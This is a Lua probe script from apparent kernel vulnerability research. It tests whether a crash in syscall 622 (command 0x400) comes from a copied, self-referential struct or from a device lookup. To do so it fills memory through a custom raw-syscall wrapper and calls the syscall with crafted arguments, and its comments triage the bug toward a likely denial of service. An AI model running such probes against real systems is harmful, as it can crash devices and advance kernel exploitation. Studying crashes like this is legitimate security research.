-- CRASH_CLASS: HIGH
-- PROBE 355c: is the 622 fault in front of, or behind, the copied struct
--
-- 622 cmd 0x400 copies arg3 for arg4 bytes and then dies, for every size from 1
-- to 0x40 (243a/245a/247a). A copy of ONE byte also dies, which already argues
-- the handler is not dereferencing a field we filled. This probe makes that
-- explicit: the copied struct is filled with a pointer to itself, a valid
-- mapping, so any dereference of a copied qword would read our page and the
-- call would return. If it still dies, the fault is in front of the data - a
-- device lookup on arg1 that finds nothing - and 622 is a denial of service
-- with no controllable part.

print("=== PROBE 355c: SYS 622, DATA OR DEVICE ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function sgn(v)
    local l = to_num(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local U = function(h, l) return uint64(string.format("0x%X%08X", h, l)) end
local Z = uint64(0)
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end

local page = memory.alloc(0x1000)
local self = U(0, to_num(page))
for i = 0, 0x3F, 8 do wq(page + i, self) end
print(string.format("[A] struct at 0x%X, every qword = 0x%X (its own address)", to_num(page), to_num(page)))

print("[B] 622(0x400, 0, buf, page, 0x40, 0) with a self-referential struct")
local ok, rv = pcall(function()
    return make_syscall(622)(U(0, 0x400), Z, U(0, to_num(page) + 0x800), U(0, to_num(page)), U(0, 0x40), Z)
end)
print(string.format("[C] returned: %s", ok and tostring(sgn(rv)) or "EXC"))

print("[D] zeroed control")
for i = 0, 0x3F, 8 do wq(page + 0x200 + i, 0) end
local ok2, rv2 = pcall(function()
    return make_syscall(622)(U(0, 0x400), Z, U(0, to_num(page) + 0x800), U(0, to_num(page) + 0x200), U(0, 0x40), Z)
end)
print(string.format("[E] control returned: %s", ok2 and tostring(sgn(rv2)) or "EXC"))

print("")
print("=== 355c DONE ===")
